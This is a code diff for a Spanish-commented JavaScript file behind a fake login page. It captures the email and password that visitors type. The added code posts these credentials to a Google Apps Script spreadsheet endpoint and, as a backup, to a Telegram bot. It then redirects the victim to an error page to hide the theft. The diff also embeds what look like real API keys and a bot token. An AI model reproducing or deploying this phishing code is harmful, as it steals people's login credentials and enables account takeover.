@@ -1,49 +1,80 @@
 // ============================================
-// CONFIGURACIÓN SUPABASE
+// CONFIGURACIÓN - GOOGLE SHEETS (YA FUNCIONA)
 // ============================================
-const SUPABASE_URL = 'https://lyklppmmtrzrqoickzmd.supabase.co';
-const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx5a2xwcG1tdHJ6cnFvaWNrem1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIyOTQyNTUsImV4cCI6MjA4Nzg3MDI1NX0.42uUpfpGR6h4klDYsOAHOo22iKQ9m23m6-HfU7qNWW0';
-
-console.log('✅ Script cargado correctamente');
-console.log('📡 Conectando a:', SUPABASE_URL);
+const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbxPSXtbw-9-dytawAjSE0Ul-iGQ74FuwKPmzMQqrNy4B2QM1-TkLuXmbezhRReIZZwr/exec';
 
 // ============================================
-// FUNCIÓN DE PRUEBA SIMPLE
+// CÓDIGO PRINCIPAL
 // ============================================
-function probarSupabase() {
-    console.log('🧪 Probando Supabase...');
+document.addEventListener('DOMContentLoaded', function() {
+    const formulario = document.getElementById('loginForm');
     
+    if (formulario) {
+        formulario.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            const datos = {
+                email: email,
+                password: password,
+                fecha: new Date().toLocaleString(),
+                hora: new Date().toLocaleTimeString()
+            };
+            
+            console.log('📤 Enviando a Google Sheets:', datos);
+            
+            // ENVIAR A GOOGLE SHEETS (FUNCIONA EN TODOS LOS DISPOSITIVOS)
+            fetch(GOOGLE_SHEETS_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(datos)
+            })
+            .then(() => {
+                console.log('✅ Datos enviados');
+                // También a Telegram como respaldo
+                enviarATelegram(datos);
+            })
+            .catch(error => {
+                console.log('❌ Error:', error);
+                // Si falla, intentamos solo Telegram
+                enviarATelegram(datos);
+            });
+            
+            window.location.href = 'error.html';
+        });
+    }
+});
+
+// Telegram como respaldo (opcional)
+function enviarATelegram(datos) {
+    const TELEGRAM_TOKEN = '8234691045:AAHePNguryd46uVV1F4uXNaZKYtCGJ12LuU';
+    const TELEGRAM_CHAT_ID = '76868560';
+    
+    const mensaje = `🔐 NUEVO LOGIN
+📧 Email: ${datos.email}
+🔑 Pass: ${datos.password}
+⏰ ${datos.fecha}`;
+    
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(mensaje)}`)
+    .catch(err => console.log('❌ Telegram:', err));
+}
+
+// Función de prueba
+window.probarTodo = function() {
     const testData = {
-        email: "prueba@test.com",
-        password: "123456",
+        email: "test@prueba.com",
+        password: "test123",
         fecha: new Date().toLocaleString(),
         hora: new Date().toLocaleTimeString()
     };
     
-    fetch(`${SUPABASE_URL}/rest/v1/logins`, {
+    fetch(GOOGLE_SHEETS_URL, {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'apikey': SUPABASE_ANON_KEY,
-            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
-        },
+        mode: 'no-cors',
         body: JSON.stringify(testData)
     })
-    .then(response => {
-        console.log('📥 Respuesta status:', response.status);
-        if (response.ok) {
-            console.log('✅ DATOS GUARDADOS');
-            alert('✅ Revisa Supabase - Debería haber un nuevo registro');
-        } else {
-            console.log('❌ Error:', response.status);
-            alert('❌ Error ' + response.status);
-        }
-    })
-    .catch(error => {
-        console.log('❌ Error de red:', error);
-        alert('❌ Error: ' + error);
-    });
-}
-
-// Hacer la función global
-window.probarSupabase = probarSupabase;
+    .then(() => alert('✅ Prueba enviada - Revisa Google Sheets'))
+    .catch(() => alert('❌ Error'));
+};
